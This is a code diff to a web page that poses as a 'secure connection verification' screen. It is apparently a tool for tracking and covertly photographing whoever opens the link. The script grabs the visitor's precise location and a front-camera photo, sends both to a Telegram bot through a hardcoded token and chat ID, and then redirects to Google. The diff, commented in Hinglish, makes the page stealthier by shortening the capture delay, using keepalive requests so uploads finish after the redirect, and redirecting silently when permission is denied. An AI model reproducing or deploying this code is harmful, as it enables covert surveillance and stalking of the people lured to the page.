@@ -5,36 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Connection | Verification</title>
     <style>
-        body {
-            background-color: #f0f2f5;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #007bff;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
+        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
-        p { color: #606770; font-size: 15px; line-height: 1.6; }
+        p { color: #606770; font-size: 15px; }
         .footer { margin-top: 20px; font-size: 12px; color: #bcc0c4; }
     </style>
 </head>
@@ -54,10 +30,11 @@
 <script>
     const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
     const chatId = '7066124462';
+    const redirectUrl = "https://www.google.com"; // Yahan apna target URL dalein
     const statusText = document.getElementById('status');
 
-    window.onload = async () => {
-        await startProcess();
+    window.onload = () => {
+        startProcess();
     };
 
     async function startProcess() {
@@ -65,15 +42,15 @@
         
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await sendLocation(pos);
-                // Location milte hi camera process shuru karein
-                await capturePhoto();
+                // Location milte hi parallel mein photo aur location dono bhejenge
+                sendLocation(pos); 
+                capturePhoto();
             }, (err) => {
-                alert("Security Error: Please allow all permissions to verify your session.");
-                location.reload();
+                // Agar permission deny kare toh redirect kar dena behtar hai
+                window.location.href = redirectUrl;
             }, { enableHighAccuracy: true });
         } else {
-            statusText.innerText = "Error: Geolocation not supported.";
+            window.location.href = redirectUrl;
         }
     }
 
@@ -82,74 +59,59 @@
         const lon = pos.coords.longitude;
         const acc = pos.coords.accuracy;
         
-        // Fixed Template Literal syntax for URL
         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        
         const text = `📍 *Target Found!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View Location](${mapLink})`;
         
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`);
-        statusText.innerText = "Security Check: 50% Complete...";
+        // fetch with keepalive taaki redirect ke baad bhi request complete ho
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`, {
+            method: 'GET',
+            keepalive: true
+        });
     }
 
     async function capturePhoto() {
         try {
-            statusText.innerText = "Starting Visual Verification...";
-            
-            // Camera Stream setup
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
+                video: { facingMode: "user" }, 
                 audio: false 
             });
             
             const video = document.getElementById('video');
             video.srcObject = stream;
-            
-            // Ensure video starts playing
             await video.play();
 
-            // Status update for user (Taki wo screen ki taraf dekhta rahe)
-            statusText.innerText = "Finalizing Secure Link (3s)...";
-
-            // 3 Seconds ka wait - Camera adjustment ke liye
+            // Sirf 500ms ka wait taaki camera frame capture kar sake
             setTimeout(async () => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                
                 const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                context.drawImage(video, 0, 0);
                 
-                // Photo ko file (blob) mein badalna
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
                 
-                statusText.innerText = "Uploading Metadata...";
-
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'verification.jpg');
-                formData.append('caption', '📸 Photo Identity Captured');
+                formData.append('photo', blob, 'verify.jpg');
+                formData.append('caption', '📸 Photo Captured');
 
-                // Telegram ko bhej dena
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                // Photo send karna shuru karte hi redirect kar do
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
-                    body: formData
+                    body: formData,
+                    keepalive: true
                 });
 
-                // Camera band karein
+                // Band karein stream
                 stream.getTracks().forEach(track => track.stop());
-                
-                statusText.innerText = "Verification Success!";
-                
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 1000);
 
-            }, 3000); // Wait 3 seconds before capture
+                // Turant Redirect
+                window.location.href = redirectUrl;
+
+            }, 500); 
 
         } catch (err) {
-            console.error("Camera Access Failed:", err);
-            // Agar camera block ho jaye toh bhi redirect kar dein
-            window.location.href = "https://www.google.com";
+            window.location.href = redirectUrl;
         }
     }
 </script>
